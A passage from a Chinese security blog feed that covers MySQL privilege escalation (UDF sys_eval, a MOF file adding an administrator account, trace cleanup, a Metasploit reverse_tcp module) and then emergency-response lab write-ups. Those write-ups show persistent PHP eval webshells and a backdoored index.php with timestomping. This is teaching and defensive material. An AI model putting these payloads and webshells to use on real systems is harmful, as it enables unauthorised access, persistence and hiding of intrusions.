INTO OUTFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><p>十六进制的获取可以直接本地用mysql的hex函数编码一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接传入路径编码</span><br>SELECT hex(load_file(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><br><span class="hljs-comment"># 也可以将路径 hex 编码</span><br>SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));<br></code></pre></td></tr></table></figure><p><strong>然后就是创建自定义函数并调用命令</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br>#查看是否新增了sys_eval<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br>#然后就可以执行系统命令了<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>#删除自定义函数<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><blockquote><p>如果想看so文件里面有哪些函数，可以拖进ida里面看一看</p></blockquote><h1><span id="mof提权">mof提权</span></h1><p>这是一个比较老的漏洞了，基本上在 Windows Server 2003 的环境下才可以成功。</p><p>提权的原理是 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><p><strong>mof脚本的内容</strong></p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">#pragma name<span class="hljs-built_in">space</span>(<span class="hljs-string">&quot;\\\\.\\root\\subscription&quot;</span>) <br><br>instance of __EventFilter as $EventFilter <br>&#123; <br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>; <br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>; <br>&#125;; <br><br>instance of ActiveScriptEventConsumer as $Consumer <br>&#123; <br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>; <br>    ScriptText = <br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="hljs-string">&quot;)&quot;</span>; <br>&#125;; <br><br>instance of __FilterToConsumerBinding <br>&#123; <br>    Consumer   = $Consumer; <br>    Filter = $EventFilter; <br>&#125;;<br></code></pre></td></tr></table></figure><p>核心payload</p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">var WSH = <span class="hljs-keyword">new</span> ActiveXObject(\<span class="hljs-string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)<br>#这两段指令分别是使用net.exe工具添加一个名为<span class="hljs-string">&quot;hacker&quot;</span>的新用户，密码设置为<span class="hljs-string">&quot;P@ssw0rd&quot;</span>。/add参数表示添加一个新用户<br>#将用户<span class="hljs-string">&quot;hacker&quot;</span>添加到本地管理员组（localgroup administrators）。这意味着<span class="hljs-string">&quot;hacker&quot;</span>用户将拥有管理员权限。<br></code></pre></td></tr></table></figure><p>依然可以用上面的方法把文件变成十六进制写入</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="hljs-keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;<br></code></pre></td></tr></table></figure><p>执行成功的的时候，test.mof 会出现在：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;good&#x2F; 目录下 否则出现在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad 目录下</p><p><strong>痕迹清理</strong></p><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 停止 winmgmt 服务</span><br>net stop winmgmt<br><br><span class="hljs-comment"># 删除 Repository 文件夹</span><br><span class="hljs-built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\<br><br><span class="hljs-comment"># 手动删除 mof 文件</span><br>del C:\Windows\system32\wbem\mof\good\test.mof /F /S<br><br><span class="hljs-comment"># 删除创建的用户</span><br>net user hacker /delete<br><br><span class="hljs-comment"># 重新启动服务</span><br>net start winmgmt<br></code></pre></td></tr></table></figure><p><strong>msf提权</strong></p><p>msf里面就有mof提权的模块，还会自动清理痕迹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/windows/mysql/mysql_mof<br><span class="hljs-comment"># 设置好自己的 payload</span><br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><br><span class="hljs-comment"># 设置目标 MySQL 的基础信息</span><br>msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.21<br>msf6 &gt; <span class="hljs-built_in">set</span> username root<br>msf6 &gt; <span class="hljs-built_in">set</span> password root<br>msf6 &gt; run<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考文章：&lt;a href=&quot;https://www.sqlsec.com/2020/11/mysql.html&quot;&gt;https://www.sqlsec.com/2020/11/mysql.html&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;权限获取&quot;&gt;权限获取&lt;/span</summary>
      
    
    
    
    <category term="提权" scheme="https://clowsman.github.io/categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="mysql" scheme="https://clowsman.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>玄机应急响应靶场-第二章</title>
    <link href="https://clowsman.github.io/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</id>
    <published>2024-07-10T06:31:01.000Z</published>
    <updated>2024-07-15T08:45:17.051Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="apache日志分析">Apache日志分析</span></h1><p>靶场简介：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号密码 root apacherizhi<br>ssh root@IP<br>1、提交当天访问次数最多的IP，即黑客IP：<br>2、黑客使用的浏览器指纹是什么，提交指纹的md5：<br>3、查看index.php页面被访问的次数，提交次数：<br>4、查看黑客IP访问了多少次，提交次数：<br>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:<br></code></pre></td></tr></table></figure><p>apache的日志放在&#x2F;var&#x2F;log&#x2F;apache目录下面</p><p><img src="http://cdn.clown2024.cn/202407151644888.png" alt="image-20240710153749475"></p><p>然后用下面指令筛选出访问的ip次数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d- -f 1 access.log.1|<span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span> -20 <br><span class="hljs-comment">#----------</span><br><span class="hljs-built_in">cut</span>命令用于剪切并分割文件中的行。<br>-d-指定分隔符为<span class="hljs-string">&quot;-&quot;</span>，即以连字符作为字段的分隔符。<br>-f 1指定只提取每个字段的第一个部分，也就是行的第一个元素。<br><br><span class="hljs-built_in">sort</span>命令用于对文本行进行排序。<br>-r选项表示以逆序（从大到小）排序。<br>-n选项表示按照数值大小进行排序。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644889.png" alt="image-20240710155027635"></p><p>flag{192.168.200.2}</p><p>浏览器指纹就过滤一下看看具体的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep 192.168.200.2<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644890.png" alt="image-20240710155145579"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//浏览器指纹<br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br><br>flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;<br></code></pre></td></tr></table></figure><p> 找index.php页面被访问的次数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;/index.php&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment"># wc -l命令用于计算匹配到的行数，flag&#123;27&#125;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644891.png" alt="image-20240711125509920"></p><p>查找黑客ip访问的次数，我们只要把去掉重复行改成计算匹配行数即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;192.168.200.2 - -&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment">#flag&#123;6555&#125;</span><br></code></pre></td></tr></table></figure><p>查看2023年8月03日8时这一个小时内有多少IP访问，把第一个查看访问ip改成时间即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;03/Aug/2023:08:&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -nr| <span class="hljs-built_in">uniq</span> -c<br><span class="hljs-comment"># 我们要用ip来匹配才能正确去掉重复行，所以要先awk打印第一个字段也就是ip</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644892.png" alt="image-20240711130832864"></p><p>flag{5}</p><h1><span id="mysql应急响应">mysql应急响应</span></h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mysql应急响应 ssh账号 root  密码 xjmysql<br>ssh env.xj.edisec.net  -p xxxxx<br>1.黑客第一次写入的shell flag&#123;关键字符串&#125; <br>2.黑客反弹shell的ip flag&#123;ip&#125;<br>3.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx.xx<br>4.黑客获取的权限 flag&#123;whoami后的值&#125;<br></code></pre></td></tr></table></figure><p>先去看一下mysql的日志，在&#x2F;var&#x2F;log&#x2F;mysql下面</p><p><img src="http://cdn.clown2024.cn/202407151644893.png" alt="image-20240711182807349"></p><p><img src="http://cdn.clown2024.cn/202407151644894.png" alt="image-20240711182925627"></p><p>看看web目录下有没有被写shell，毕竟一般都是从网站开始渗透的</p><p><img src="http://cdn.clown2024.cn/202407151644895.png" alt="image-20240711183039409"></p><p>果然有，flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</p><p>也可以直接使用河马查杀，刚学到的，下载也很快，这是官网：<a href="https://www.shellpub.com/doc/hm_linux_usage.html">https://www.shellpub.com/doc/hm_linux_usage.html</a></p><p>用法也很简单</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载解压缩</span><br>wget -O /opt/hm-linux.tgz http://dl.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.7.0<br><span class="hljs-built_in">cd</span> /opt<br>tar xvf hm-linux.tgz<br><span class="hljs-comment"># 使用</span><br>./hm deepscan &lt;要扫描的目录&gt; <span class="hljs-comment"># 深度扫描，扫描完成之后结果会保存为result.csv文件</span><br>./hm scan &lt;要扫描的目录&gt; <span class="hljs-comment">#扫描完成之后结果会保存为result.csv文件，使用记事本或者excel打开查看</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644896.png" alt="image-20240711183620135"></p><p>查找反弹shell的地址，我们可以看看error.log有没有什么异常的地方</p><p><img src="http://cdn.clown2024.cn/202407151644897.png" alt="image-20240711183935052"></p><p>感觉&#x2F;tmp&#x2F;1.sh有点奇怪，去看一下</p><p><img src="http://cdn.clown2024.cn/202407151644898.png" alt="image-20240711184013639"></p><p>可以发现是一个bash的反弹shell指令，找到反弹的地址，flag{192.168.100.13}</p><p>这个文件在&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;下也有</p><p><img src="http://cdn.clown2024.cn/202407151644899.png" alt="image-20240712001549368"></p><p>寻找黑客提权的完整路径，这里能够提权应该泄露了一些用户信息，我们发现在web目录下的common.php里面有root用户的信息</p><p><img src="http://cdn.clown2024.cn/202407151644900.png" alt="image-20240712002457267"></p><p>mysql常规的提权套路就是udf提权，如果是的话那么应该就会在 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;留下文件痕迹，我们去看一下</p><p><img src="http://cdn.clown2024.cn/202407151644901.png" alt="image-20240711184502176"></p><p>那提权路径就是&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so，flag{b1818bde4e310f3d23f1005185b973e7}</p><p>查看提权后的权限，看一下进程详细信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps -aux<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644902.png" alt="image-20240711184705362"></p><p>可以看到应该是那个mysql的用户，那么权限就是flag{mysql}</p><p>或者进入到mysql里面用**select sys_eval(“whoami”);**查看当前用户</p><p>参考文章：<a href="https://blog.csdn.net/JACKBREAK/article/details/139037618">https://blog.csdn.net/JACKBREAK/article/details/139037618</a></p><h1><span id="redis应急响应">redis应急响应</span></h1><p>靶机介绍</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">服务器场景操作系统 Linux<br>服务器账号密码 root xjredis<br><br>任务环境说明<br>    注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！<br>    应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查<br></code></pre></td></tr></table></figure><p>步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;<br>通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;<br>通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;<br>通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交<br>通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;<br></code></pre></td></tr></table></figure><p>那就先去看一下redis的日志在&#x2F;var&#x2F;log下面</p><p><img src="http://cdn.clown2024.cn/202407151644903.png" alt="image-20240712004115278"></p><p>这里找到一张主从复制时的通信过程图，所以有<strong>Master replied to PING</strong>的字段即为连接成功</p><p><img src="http://cdn.clown2024.cn/202407151644904.png" alt="image-20240712011533382"></p><p><img src="http://cdn.clown2024.cn/202407151644905.png" alt="image-20240712004200679"></p><p>这里很明显应该是一个redis的主从复制，但是都是失败连接，再往下还有尝试其他ip的连接，最后成功的是20的ip</p><p><img src="http://cdn.clown2024.cn/202407151644906.png" alt="image-20240712004754137"></p><p>flag{192.168.100.20}</p><p>既然是主从复制那一般就会上传有so文件，我们用命令查看so文件在哪里</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;exp.so&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644907.png" alt="image-20240712005221837"></p><p>可以看到在根目录下，我们查看内容里面有flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xxd /exp.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644908.png" alt="image-20240712005512837"></p><p>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</p><p>看一下定时任务找反弹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">corntab -l<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644909.png" alt="image-20240712005613810"></p><p>flag{192.168.10.13}</p><p>溯源可以去看一下.ssh下的authorized_keys</p><p><img src="http://cdn.clown2024.cn/202407151644910.png" alt="image-20240712005919183"></p><p>找到了他的用户名</p><p>xj-test-user，然后去github上看一下该用户，可以找到他使用的工具</p><p><img src="http://cdn.clown2024.cn/202407151644911.png" alt="image-20240712010113376"></p><p>再去找他的历史commit</p><p><img src="http://cdn.clown2024.cn/202407151644912.png" alt="image-20240712010420376"></p><p>在first commit里面</p><p><img src="http://cdn.clown2024.cn/202407151644913.png" alt="image-20240712010539821"></p><p>flag{xj-test-user-wow-you-find-flag}</p><p>最后查找篡改的命令，可以直接去&#x2F;usr&#x2F;bin目录下查看，这里改的是ps命令，我就说一开始用ps命令为什么怪怪的</p><p><img src="http://cdn.clown2024.cn/202407151644914.png" alt="image-20240712011217461"></p><p>flag{c195i2923381905517d818e313792d196}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;apache日志分析&quot;&gt;Apache日志分析&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;靶场简介：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code clas</summary>
      
    
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>玄机应急响应靶场-第一章</title>
    <link href="https://clowsman.github.io/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</id>
    <published>2024-07-02T05:33:05.000Z</published>
    <updated>2024-07-15T08:45:57.790Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="linux入侵排查">Linux入侵排查</span></h1><p>这是靶机的简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号：root 密码：linuxruqin<br>ssh root@IP<br>1.web目录存在木马，请找到木马的密码提交<br>2.服务器疑似存在不死马，请找到不死马的密码提交<br>3.不死马是通过哪个文件生成的，请提交文件名<br>4.黑客留下了木马文件，请找出黑客的服务器ip提交<br>5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交<br></code></pre></td></tr></table></figure><p>先简单了解一下不死马，参考文章：<a href="https://cloud.tencent.com/developer/article/1922141">https://cloud.tencent.com/developer/article/1922141</a></p><p><a href="https://blog.csdn.net/weixin_44411509/article/details/129267982">https://blog.csdn.net/weixin_44411509/article/details/129267982</a></p><p>不死马的原理就是其进程不会消亡，在内存中不断创建木马文件，从而达到无法删除的目的。</p><p>下面是一个不死马例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为true，则忽略与用户的断开；也就是访问了这个页面之后，脚本会一直在后台执行。<br>2. set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。<br>3. unlink(__FILE__)函数：删除文件本身。<br>4. file_put_contents函数：将一个字符串写入文件。<br>5. usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。<br></code></pre></td></tr></table></figure><p>还可以给不死马加一个密码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.ZYGS.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;zygs&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;ZYGS&quot;]);&#125;?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>要清除不死马的话就需要通过重启主机或服务，或者条件竞争的方式修改文件内容</p><p><strong>开始排查</strong></p><p>先进web目录，看到一个1.php里面是一句话木马</p><p><img src="http://cdn.clown2024.cn/202407151645934.png" alt="image-20240709111702355"></p><p>查看开放的端口：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -pantu<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--------</span><br>-p 表示显示进程标识符和/或进程名称，这可以帮助你查看哪个进程正在使用网络连接。<br>-a 表示显示所有活动的 TCP 连接和监听端口。<br>-n 表示以数字形式显示地址和端口号，不进行域名解析。<br>-t 表示显示 TCP 表。<br>-u 表示显示 UDP 表。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645935.png" alt="image-20240709112640729"></p><p>用该命令查找特征文件：</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br><span class="hljs-comment">#将标准输入数据转换成命令行参数，也就是将find的输入变成命令行参数传递给grep命令</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645936.png" alt="image-20240709112605958"></p><p>去查一下密码为<strong>hello</strong></p><p><img src="http://cdn.clown2024.cn/202407151645937.png" alt="image-20240709112733521"></p><p>看一下index.php的内容可以知道通过该文件生成：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$path</span> = <span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">safeword</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">createhtml</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:<span class="hljs-number">0</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br><span class="hljs-title function_ 